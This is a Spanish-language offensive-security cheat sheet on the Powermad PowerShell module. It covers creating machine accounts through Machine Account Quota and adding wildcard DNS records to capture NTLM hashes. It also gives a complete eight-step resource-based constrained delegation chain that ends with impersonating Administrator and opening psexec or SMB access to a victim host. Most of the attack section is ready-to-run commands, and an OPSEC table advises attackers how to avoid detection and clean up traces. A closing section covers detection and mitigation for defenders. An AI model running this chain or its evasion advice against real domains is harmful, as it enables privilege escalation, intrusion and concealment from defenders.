---
title: "Powermad Cheat Sheet"
category: "AD"
description: "Herramientas para Machine Account Quota y explotación de DNS dinámico."
image: "/images/wiki/4.png"
---

# Powermad: Abuso de Machine Account Quota y DNS Dinamico

**Powermad** es un modulo de PowerShell desarrollado por Kevin Robertson que expone funciones para abusar de dos superficies de ataque habituales en Active Directory:

1. **Machine Account Quota (MAQ)** -- la propiedad `ms-DS-MachineAccountQuota` que, por defecto, permite a cualquier usuario autenticado unir hasta 10 cuentas de maquina al dominio.
2. **DNS Dinamico (DDNS)** -- las actualizaciones inseguras de registros DNS dentro de zonas integradas en AD.

Estas dos capacidades combinadas son la base de cadenas de ataque como **Resource-Based Constrained Delegation (RBCD)**, **NTLM relay a LDAP** y **toma de registros DNS** para interceptacion de trafico.

| Dato | Valor |
|------|-------|
| Repositorio | [github.com/Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad) |
| Lenguaje | PowerShell (compatible PS 2.0+) |
| Dependencias | Ninguna (pure PowerShell, sin modulos de RSAT) |
| Alternativa Linux | [impacket](https://github.com/fortra/impacket) (`addcomputer.py`, `dnstool.py`) |

---

## Instalacion e Importacion

### En Windows (sesion con credenciales de dominio)

```powershell
# Clonar o descargar el repositorio
git clone https://github.com/Kevin-Robertson/Powermad.git

# Importar como dot-source (evita restricciones de Execution Policy)
. .\Powermad\Powermad.ps1

# Verificar que las funciones estan disponibles
Get-Command -Name *MachineAccount*
Get-Command -Name *DNS*
```

### En Linux con PowerShell Core

```bash
# Instalar pwsh si no esta disponible
sudo apt install -y powershell

# Importar Powermad dentro de pwsh
pwsh -c '. ./Powermad/Powermad.ps1; Get-Command *MachineAccount*'
```

> **Nota:** Para operaciones desde Linux sin PowerShell, se recomienda `impacket-addcomputer` y `dnstool.py` como alternativas nativas de Python.

---

## Machine Account Quota (MAQ)

### Concepto

El atributo `ms-DS-MachineAccountQuota` del objeto raiz del dominio define cuantas cuentas de equipo puede crear un usuario autenticado sin ser administrador. El valor por defecto es **10**. Cada cuenta de maquina creada tiene:

- Un **SPN** (`HOST/nombre$`, `RestrictedKrbHost/nombre$`).
- Credenciales conocidas por el atacante (la contrasena se establece en la creacion).
- Un objeto `computer` en AD con atributos modificables por su creador.

Esto es util porque muchas tecnicas de ataque (RBCD, Silver Ticket, S4U2Self) requieren una cuenta con SPN y credenciales controladas.

### Comprobar la Cuota Actual

```powershell
# Desde PowerShell con modulo AD (RSAT)
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota |
    Select-Object -ExpandProperty ms-DS-MachineAccountQuota

# Desde PowerShell sin RSAT (consulta LDAP directa)
([ADSI]"LDAP://RootDSE").defaultNamingContext |
    ForEach-Object { ([ADSI]"LDAP://$_")."ms-DS-MachineAccountQuota" }
```

```bash
# Desde Linux con ldapsearch (credenciales de dominio)
ldapsearch -x -H ldap://DC01.corp.local -D "usuario@corp.local" -w 'Password1' \
  -b "DC=corp,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
```

```bash
# Desde Linux con netexec (nxc)
nxc ldap DC01.corp.local -u usuario -p 'Password1' -M maq
```

### Comprobar Cuantas Maquinas Ha Creado un Usuario

```powershell
# Contar objetos computer cuyo creador sea el usuario actual
Get-ADComputer -Filter 'True' -Properties ms-DS-CreatorSID |
    Where-Object { $_.'ms-DS-CreatorSID' -eq (Get-ADUser -Identity $env:USERNAME).SID } |
    Measure-Object | Select-Object -ExpandProperty Count
```

### Crear una Cuenta de Maquina con Powermad

```powershell
# Importar Powermad
. .\Powermad.ps1

# Crear la cuenta de maquina FAKEPC$
New-MachineAccount -MachineAccount "FAKEPC" `
    -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) `
    -Verbose

# Verificar que se creo correctamente
Get-ADComputer "FAKEPC" -Properties DNSHostName, ServicePrincipalName
```

### Crear una Cuenta de Maquina desde Linux

```bash
# Con impacket (addcomputer.py)
impacket-addcomputer -computer-name 'FAKEPC$' -computer-pass 'Passw0rd!' \
    -dc-ip 10.10.10.100 'corp.local/usuario:Password1'

# Con netexec
nxc smb DC01.corp.local -u usuario -p 'Password1' \
    -M add-computer -o NAME=FAKEPC PASSWORD='Passw0rd!'
```

### Eliminar una Cuenta de Maquina

```powershell
# Eliminar la cuenta creada (requiere ser el creador o tener permisos)
Disable-MachineAccount -MachineAccount "FAKEPC" -Verbose

# Alternativa con cmdlet AD
Remove-ADComputer -Identity "FAKEPC" -Confirm:$false
```

---

## Abuso de DNS Dinamico

### Concepto

Las zonas DNS integradas en Active Directory suelen permitir **actualizaciones dinamicas no seguras** o **seguras** (Secure Dynamic Updates). Incluso con actualizaciones seguras, cualquier usuario autenticado puede:

- **Crear** nuevos registros A o AAAA apuntando a una IP controlada.
- **Modificar** registros que el mismo creo.
- **Abusar de registros huerfanos** (Stale records) que perdieron su propietario.

Esto permite ataques de **envenenamiento DNS interno** sin necesidad de LLMNR/NBNS.

### Funciones DNS de Powermad

| Funcion | Descripcion |
|---------|-------------|
| `Invoke-DNSUpdate` | Agrega o modifica un registro A/AAAA usando DNS Dynamic Update |
| `Disable-ADIDNSNode` | Deshabilita (marca como tombstoned) un nodo DNS existente |
| `Enable-ADIDNSNode` | Reactiva un nodo DNS deshabilitado |
| `Get-ADIDNSNodeAttribute` | Lee atributos de un nodo DNS en la particion AD |
| `Get-ADIDNSNodeOwner` | Muestra el propietario (creador) de un nodo DNS |
| `Get-ADIDNSNodeTombstoned` | Lista nodos DNS en estado tombstoned |
| `Get-ADIDNSPermission` | Lee la ACL de un nodo DNS |
| `Get-ADIDNSZone` | Lista zonas DNS integradas en AD |
| `Grant-ADIDNSPermission` | Modifica la ACL de un nodo DNS |
| `New-ADIDNSNode` | Crea un nuevo nodo DNS via LDAP |
| `New-DNSRecordArray` | Construye el blob binario para un registro DNS |
| `New-SOASerialNumberArray` | Genera un serial SOA para inyeccion de registros |
| `Remove-ADIDNSNode` | Elimina un nodo DNS |
| `Rename-ADIDNSNode` | Renombra un nodo DNS |
| `Revoke-ADIDNSPermission` | Revoca permisos sobre un nodo DNS |
| `Set-ADIDNSNodeAttribute` | Modifica atributos de un nodo DNS |
| `Set-ADIDNSNodeOwner` | Cambia el propietario de un nodo DNS |

### Agregar un Registro DNS

```powershell
# Agregar un registro A que apunte a nuestra IP
Invoke-DNSUpdate -DNSType A -DNSName "attacker" -DNSData "10.10.14.5" `
    -DNSZone "corp.local" -Verbose

# Agregar un registro apuntando a un nombre existente (wildcard)
New-ADIDNSNode -Node "*" -Data "10.10.14.5" -Zone "corp.local" -Verbose
```

### Crear un Registro via LDAP (Alternativa)

```powershell
# Crear nodo DNS via LDAP (util cuando DNS Update esta bloqueado)
New-ADIDNSNode -Node "pwned" -Data "10.10.14.5" -Zone "corp.local" -Verbose

# Verificar que el registro se resuelve
nslookup pwned.corp.local DC01.corp.local
```

### Registro Wildcard para Captura de Trafico

```powershell
# El registro wildcard (*) responde a cualquier consulta DNS sin match exacto
New-ADIDNSNode -Node "*" -Data "10.10.14.5" -Zone "corp.local" -Verbose

# Ahora cualquier nombre no existente en la zona resuelve a nuestra IP
# Util para capturar hashes NTLMv2 con Responder o ntlmrelayx
```

### Abuso DNS desde Linux

```bash
# Agregar registro A con dnstool.py (Krbrelayx toolkit)
python3 dnstool.py -u 'corp.local\usuario' -p 'Password1' \
    -r 'attacker.corp.local' -a add -t A -d '10.10.14.5' DC01.corp.local

# Verificar
nslookup attacker.corp.local DC01.corp.local
```

---

## Cadena de Ataque RBCD Completa

### Concepto de Resource-Based Constrained Delegation

La delegacion restringida basada en recursos (RBCD) permite que un servicio se autentique ante otro **en nombre de un usuario** sin requerir la flag `TRUSTED_FOR_DELEGATION`. La configuracion se almacena en el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` del objeto **destino** (la maquina victima).

**Requisitos para el ataque:**

| Requisito | Descripcion |
|-----------|-------------|
| Permiso de escritura sobre la victima | `GenericAll`, `GenericWrite`, `WriteProperty` o `WriteDACL` sobre el objeto computer destino |
| Cuenta con SPN controlada | Una cuenta de maquina cuya contrasena conozcamos (creada via MAQ) |
| Herramientas | Powermad + PowerView (o StandIn) + Rubeus (Windows) / impacket (Linux) |

### Paso 1 -- Identificar Targets con Permisos de Escritura

```powershell
# Con PowerView: buscar objetos computer donde nuestro usuario tenga GenericWrite/GenericAll
Import-Module .\PowerView.ps1

Find-InterestingDomainAcl -ResolveGUIDs |
    Where-Object {
        $_.IdentityReferenceName -eq "usuario" -and
        ($_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty")
    } | Select-Object ObjectDN, ActiveDirectoryRights
```

```bash
# Desde Linux con bloodhound-python o aclpwn
bloodhound-python -u usuario -p 'Password1' -d corp.local -c acl -ns 10.10.10.100
# Revisar en BloodHound: "Shortest Path to Domain Admins" o consultas RBCD personalizadas
```

### Paso 2 -- Crear Cuenta de Maquina Atacante

```powershell
# Importar Powermad y crear la maquina
. .\Powermad.ps1

New-MachineAccount -MachineAccount "ATACANTE" `
    -Password $(ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force) `
    -Verbose
```

```bash
# Alternativa Linux
impacket-addcomputer -computer-name 'ATACANTE$' -computer-pass 'Passw0rd!' \
    -dc-ip 10.10.10.100 'corp.local/usuario:Password1'
```

### Paso 3 -- Obtener el SID de la Maquina Atacante

```powershell
# Con PowerView
$atacanteSID = Get-DomainComputer "ATACANTE" -Properties ObjectSid |
    Select-Object -ExpandProperty ObjectSid
Write-Output "SID de ATACANTE: $atacanteSID"

# Con cmdlet nativo
$atacanteSID = (Get-ADComputer "ATACANTE").SID.Value
```

```bash
# Desde Linux con pywerview o ldapsearch
pywerview get-netcomputer -u usuario -p 'Password1' -t DC01.corp.local \
    --computername ATACANTE --full-data | grep objectSid
```

### Paso 4 -- Configurar la Delegacion en la Victima

```powershell
# Construir el Security Descriptor con el SID de ATACANTE$
$SD = New-Object Security.AccessControl.RawSecurityDescriptor(
    "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$atacanteSID)"
)
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Aplicar el descriptor en la victima (requiere GenericWrite sobre VICTIMA$)
# Opcion A: Con PowerView
Set-DomainObject -Identity "VICTIMA$" -Set @{
    'msDS-AllowedToActOnBehalfOfOtherIdentity' = $SDBytes
} -Verbose

# Opcion B: Con Set-ADComputer (modulo AD RSAT)
Set-ADComputer "VICTIMA" -PrincipalsAllowedToDelegateToAccount (
    Get-ADComputer "ATACANTE"
)
```

```bash
# Desde Linux con rbcd.py (impacket)
impacket-rbcd -delegate-from 'ATACANTE$' -delegate-to 'VICTIMA$' \
    -dc-ip 10.10.10.100 -action write 'corp.local/usuario:Password1'
```

### Paso 5 -- Verificar la Delegacion

```powershell
# Leer el atributo para confirmar
Get-ADComputer "VICTIMA" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object -ExpandProperty msDS-AllowedToActOnBehalfOfOtherIdentity |
    ForEach-Object { (New-Object Security.AccessControl.RawSecurityDescriptor($_.Value, 0)).DiscretionaryAcl }
```

```bash
# Desde Linux
impacket-rbcd -delegate-to 'VICTIMA$' -dc-ip 10.10.10.100 \
    -action read 'corp.local/usuario:Password1'
```

### Paso 6 -- Solicitar Ticket con S4U (Impersonacion)

```powershell
# Calcular el hash RC4 de la contrasena de ATACANTE$
.\Rubeus.exe hash /password:Passw0rd! /user:ATACANTE$ /domain:corp.local

# S4U2Self + S4U2Proxy para obtener TGS como Administrator hacia VICTIMA
.\Rubeus.exe s4u /user:ATACANTE$ /rc4:<HASH_NT> /impersonateuser:Administrator \
    /msdsspn:cifs/VICTIMA.corp.local /ptt
```

```bash
# Desde Linux con impacket
# Obtener TGT de la maquina atacante
impacket-getST -spn 'cifs/VICTIMA.corp.local' -impersonate Administrator \
    -dc-ip 10.10.10.100 'corp.local/ATACANTE$:Passw0rd!'

# Exportar el ticket para su uso
export KRB5CCNAME=Administrator@cifs_VICTIMA.corp.local@CORP.LOCAL.ccache
```

### Paso 7 -- Acceso a la Victima

```powershell
# Con el ticket inyectado (ptt), acceder al recurso compartido
ls \\VICTIMA.corp.local\C$

# O abrir una sesion remota
Enter-PSSession -ComputerName VICTIMA.corp.local
```

```bash
# Desde Linux con el ticket Kerberos
impacket-psexec -k -no-pass corp.local/Administrator@VICTIMA.corp.local

# O con smbclient
smbclient //VICTIMA.corp.local/C$ -k --no-pass
```

### Paso 8 -- Limpieza (Post-Explotacion)

```powershell
# Eliminar la delegacion de la victima
Set-ADComputer "VICTIMA" -PrincipalsAllowedToDelegateToAccount $null

# Eliminar la cuenta de maquina creada
Remove-ADComputer "ATACANTE" -Confirm:$false
```

```bash
# Desde Linux
impacket-rbcd -delegate-to 'VICTIMA$' -dc-ip 10.10.10.100 \
    -action flush 'corp.local/usuario:Password1'

impacket-addcomputer -computer-name 'ATACANTE$' -dc-ip 10.10.10.100 \
    -delete 'corp.local/usuario:Password1'
```

---

## Otras Funciones Utiles de Powermad

### Cambiar la Contrasena de una Maquina Existente

```powershell
# Cambiar la contrasena de una cuenta de maquina que controlemos
Set-MachineAccountAttribute -MachineAccount "FAKEPC" `
    -Attribute unicodePwd `
    -Value $(ConvertTo-SecureString 'NuevaPass123!' -AsPlainText -Force) `
    -Verbose
```

### Leer Atributos de una Cuenta de Maquina

```powershell
Get-MachineAccountAttribute -MachineAccount "FAKEPC" -Attribute DNSHostName
Get-MachineAccountAttribute -MachineAccount "FAKEPC" -Attribute ServicePrincipalName
```

### Establecer el DNSHostName de una Maquina

```powershell
# Util para ataques de coercion o para que la maquina "parezca" otro host
Set-MachineAccountAttribute -MachineAccount "FAKEPC" `
    -Attribute DNSHostName -Value "victima.corp.local" -Verbose
```

---

## Consideraciones OPSEC

| Aspecto | Riesgo | Mitigacion (atacante) |
|---------|--------|-----------------------|
| Creacion de cuentas de maquina | Genera evento **4741** (computer account created) en el DC | Eliminar la cuenta al finalizar; usar nombres plausibles (no `EVIL`, `HACKER`) |
| Nombre de la maquina | Nombres sospechosos llaman la atencion en logs | Usar patron corporativo: `WS-IT-042`, `PC-VENTAS-03` |
| Contrasena de la maquina | Contrasenas debiles o conocidas pueden detectarse | Usar contrasenas complejas y largas |
| Modificacion de DNS | Genera eventos DNS analitycs (Event ID **541** zone update) | Revertir los registros despues del ataque |
| Escritura de `msDS-AllowedToActOnBehalfOfOtherIdentity` | Genera evento **5136** (directory service object modified) | Limpiar el atributo despues de obtener acceso |
| Ticket S4U | El TGS solicitado aparece en logs de Kerberos (**4769**) | Minimizar la ventana temporal entre solicitud y acceso |
| Persistencia via RBCD | Si no se limpia, el blue team puede descubrirlo en auditorias | Tratar RBCD como acceso, no como persistencia |

### Recomendaciones de Nombre para la Maquina

```powershell
# Consultar el patron de nombres existente
Get-ADComputer -Filter * -Properties Name |
    Select-Object -ExpandProperty Name |
    Sort-Object | Select-Object -First 20

# Usar un nombre que encaje con el patron
New-MachineAccount -MachineAccount "PC-CONT-017" `
    -Password $(ConvertTo-SecureString 'C0mpl3x!P@ss#2024' -AsPlainText -Force)
```

---

## Deteccion y Mitigacion (Blue Team)

### Indicadores de Compromiso

| Evento | ID | Descripcion |
|--------|----|-------------|
| Computer account created | **4741** | Nueva cuenta de maquina anadida al dominio |
| Directory object modified | **5136** | Cambio en atributos sensibles como `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Kerberos TGS request | **4769** | Solicitud de ticket de servicio (S4U2Proxy) |
| DNS zone update | **541** (DNS Analytics) | Registro DNS creado o modificado |
| Computer account deleted | **4743** | Cuenta de maquina eliminada (limpieza post-ataque) |

### Consultas de Deteccion

```powershell
# Detectar cuentas de maquina creadas por usuarios no privilegiados
Get-ADComputer -Filter * -Properties ms-DS-CreatorSID, WhenCreated |
    Where-Object { $_.'ms-DS-CreatorSID' -ne $null } |
    Select-Object Name, WhenCreated, 'ms-DS-CreatorSID'

# Detectar objetos con delegacion RBCD configurada
Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -like '*'} `
    -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
    Select-Object Name, DistinguishedName
```

```bash
# Buscar delegacion RBCD con ldapsearch
ldapsearch -x -H ldap://DC01.corp.local -D "usuario@corp.local" -w 'Password1' \
    -b "DC=corp,DC=local" "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)" dn
```

### Mitigaciones Recomendadas

| Mitigacion | Implementacion |
|------------|----------------|
| Reducir MAQ a 0 | `Set-ADDomain -Identity corp.local -Replace @{"ms-DS-MachineAccountQuota"=0}` |
| Monitorizar 4741 + 5136 | SIEM rule: alerta si un usuario no-admin crea cuentas de maquina o modifica atributos de delegacion |
| Restringir DNS Dynamic Updates | Configurar la zona DNS como "Secure only" y auditar permisos de creacion |
| Auditar RBCD periodicamente | Script programado que busque `msDS-AllowedToActOnBehalfOfOtherIdentity` no vacio |
| Tiering de cuentas | Cuentas administrativas en Tier 0 no deben autenticarse en estaciones Tier 1/2 |
| Proteger cuentas sensibles | Marcar cuentas criticas como "Account is sensitive and cannot be delegated" |

---

## Herramientas Relacionadas

| Herramienta | Uso en la Cadena | Enlace |
|-------------|------------------|--------|
| **Powermad** | Crear cuentas de maquina, manipular DNS | [GitHub](https://github.com/Kevin-Robertson/Powermad) |
| **PowerView** | Enumerar ACLs, configurar RBCD (`Set-DomainObject`) | [GitHub](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) |
| **Rubeus** | Solicitar tickets Kerberos (S4U2Self, S4U2Proxy) | [GitHub](https://github.com/GhostPack/Rubeus) |
| **Impacket** | Equivalentes Linux: `addcomputer.py`, `rbcd.py`, `getST.py` | [GitHub](https://github.com/fortra/impacket) |
| **StandIn** | Alternativa a PowerView para manipular objetos AD | [GitHub](https://github.com/FuzzySecurity/StandIn) |
| **Krbrelayx** | Toolkit DNS (`dnstool.py`) y relay Kerberos | [GitHub](https://github.com/dirkjanm/krbrelayx) |
| **BloodHound** | Mapear rutas de ataque y permisos en AD | [GitHub](https://github.com/BloodHoundAD/BloodHound) |
| **Certify / Certipy** | Abuso de AD CS (combinable con RBCD via certificados) | [GitHub](https://github.com/ly4k/Certipy) |

---

## Referencias

- Kevin Robertson -- [Powermad README](https://github.com/Kevin-Robertson/Powermad/blob/master/README.md)
- Elad Shamir -- [Wagging the Dog: Abusing Resource-Based Constrained Delegation](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- Dirk-jan Mollema -- [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
- Microsoft -- [ms-DS-MachineAccountQuota attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)
- SpecterOps -- [An ACE Up the Sleeve](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-27aa26f5fa46)
